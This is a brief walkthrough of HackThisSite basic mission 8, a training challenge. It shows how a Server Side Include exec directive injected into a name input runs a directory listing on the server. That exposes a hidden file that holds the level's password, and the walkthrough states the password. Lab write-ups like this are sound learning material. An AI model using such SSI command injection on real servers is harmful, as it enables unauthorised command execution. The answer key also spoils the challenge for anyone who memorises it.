# Description

Sam remains confident that an obscured password file is still the best idea, but he screwed up with the calendar program. Sam has saved the unencrypted password file in /var/www/hackthissite.org/html/missions/basic/8/

However, Sam's young daughter Stephanie has just learned to program in PHP. She's talented for her age, but she knows nothing about security. She recently learned about saving files, and she wrote a script to demonstrate her ability.

# Solution

If we read the main page text it says you need SSI commands which stands for ` Server Side Includes`

So here we need to include commands what a server can understand and possibly run.

Here are a great list of resources you can use for this manner.

`https://www.w3.org/Jigsaw/Doc/User/SSI.html`

So back to our mission.

Inject the following code to the input field.

`<!--#exec cmd="ls ../"-->`

this will basicaly tell the server to `Exec`ute the `cmd` line and runt the `ls` list script to show the files stored in that folder.

Then on your next window this appears

`Your file has been saved. Please click here view the file.`

Click on the HERE text.

Then this popps up.

`Hi, au12ha39vc.php index.php level8.php tmp! Your name contains 39 characters.`

Now as we already know open the `au12ha39vc.php`

like this

`https://www.hackthissite.org/missions/basic/8/au12ha39vc.php`


And your password will be: `e330caf5`

And we passed.

Lets see level 9